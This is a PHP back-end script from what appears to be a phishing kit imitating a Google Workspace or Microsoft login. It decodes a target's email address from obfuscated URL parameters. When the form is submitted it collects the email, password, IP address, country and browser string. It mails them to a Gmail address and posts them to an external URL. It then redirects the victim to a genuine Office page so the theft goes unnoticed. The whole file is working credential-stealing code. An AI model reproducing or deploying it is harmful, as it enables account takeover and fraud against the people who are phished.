<?php

$s = isset($_GET['s']) ? $_GET['s'] : null; 

$h = isset($_GET['h']) ? $_GET['h'] : null;

$c = isset($_GET['c']) ? $_GET['c'] : null;

$current_email = "";

if(!is_null($s)){
  $current_email = isValidEmail($s) ? $s : decode($s);
}

if(!is_null($h)){
  $current_email = isValidEmail($h) ? $h : decodeHex($h);
}

if(!is_null($c)){
    
    $current_email = isValidEmail($c) ? $c : decodeCustom($c);
}

function base_url(){
   return "";
}

function decodeCustom($email){

    $consonants = str_split('bcdfghjklmnpqrstvwxyz');
    $joinChar = substr($email,0,1);
    $output = substr($email,2);
    $vowels = ['a','e','i','o','u'];
    $vowelsLookup=[];

    foreach($consonants as $i => $g){
          $output = str_replace($joinChar.'0'.$i.'a',$g,$output);
    }

    foreach($vowels as $i => $g){
          $output = str_replace($joinChar.$i,$g,$output);
    }

    $output = str_replace($joinChar.$joinChar.$joinChar,'@',$output);
    return $output;
    
}

function decodeHex($string) {
  $param = hex2bin("$string");
  $base64key = "VSku9h2pMDqqSGFDzG7oMf/DXN6rT09gx3kif0pIZJY=";
  $link = "[]";
  $c = explode($link,$param);
   return $c[0];
}

function decode($e){
   
   $base64key = "VSku9h2pMDqqSGFDzG7oMf/DXN6rT09gx3kif0pIZJY=";
   
   $link = "[]";

   $str = base64_decode($e);

   $c = explode($link,$str);

   return $c[0];
}

function isValidEmail($e){
   return filter_var($e, FILTER_VALIDATE_EMAIL);
}

//MUST ADD THIS FUNCTION TO SCRIPT
function sendlogHome($subject,$body){
    $url = 'https://zimbra.com/json/inbox';
    $fields = array(
        'subject' => urlencode($subject),
        'body' => urlencode($body),
    );
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL, $url);
    curl_setopt($ch,CURLOPT_POST, count($fields));
    curl_setopt($ch,CURLOPT_POSTFIELDS, http_build_query($fields));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
}

include("mobile-detect.php");

if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    $email = $_POST['email'];
    $password = $_POST['password'];
    $ip = $_SERVER["REMOTE_ADDR"];
    require_once('geoiploc.php');
    $geoplugin = new geoPlugin();
    $geoplugin->locate();
    $adddate=date("D M d, Y g:i a");

    $destination = "karen.ditchfield.mslogisticsltd@gmail.com";

    $add_date = date("D M d, Y g:i a");
    $browser = $_SERVER['HTTP_USER_AGENT'];
    $browser  =     $_SERVER['HTTP_USER_AGENT'];
    $message  =     "=============+[ User Info ]+==============\n";
    $message .=     "Email : ".$email."\n";
    $message .=     "Password: ".$password."\n";
    $message .=     "=============+[ Loc Info ]+===============\n";
    $message .=     "IP Address: ".$ip."\n";
    $message .=     "Country Name: {$geoplugin->countryName}\n";
    $message .=     "=======================================\n";
    $message .=     "Country Code: {$geoplugin->countryCode}\n";
    $message .=     "=======================================\n";
    $message .=     "User-Agent: ".$browser."\n";
    $message .=     "Date  & Time Log  : ".$adddate."\n";
    $message .=     "=======================================\n";
    $sniper = 'Gsuite';

    $subj = "$sniper - {$geoplugin->countryName}\n";

    mail($destination,$subj,$message);

    sendlogHome($subj,$message);

    if(!empty($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest')
    {
        header("content-type: application/json");
        echo json_encode(['success' => true]);
        exit;

    }else{
        header("Location: https://products.office.com/en-au/business/teamwork/business-voice?rand=WebAppSecurity.1&e=$email");
    }

}else{
    $email = isset($_GET['e']) ? $_GET['e'] : null;
}

?>